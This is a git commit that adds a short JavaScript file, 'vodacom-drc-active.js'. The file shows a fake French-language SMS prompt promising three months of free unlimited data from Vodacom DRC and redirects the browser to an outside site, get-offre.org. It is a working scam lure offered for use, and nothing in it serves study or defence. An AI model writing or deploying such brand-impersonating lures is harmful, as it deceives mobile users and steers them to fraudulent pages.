a74809bdef5e936f8861df6b29461825ea806567
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-27 00:03:17 -0800

    Create vodacom-drc-active.js

---
+++ vodacom-drc-active.js
@@ -0,0 +1,6 @@
+
+var password = 'DONNÉES ILLIMITÉES'
+password=prompt('SMS: Félicitations, vous êtes admissible à 3 mois de données gratuites illimitées, veuillez appuyer sur OK pour activer maintenant   ','DONNÉES ILLIMITÉES');
+if (password != 'DONNÉES ILLIMITÉES') {
+location.href='https://get-offre.org/vodacom-drc.html';
+}
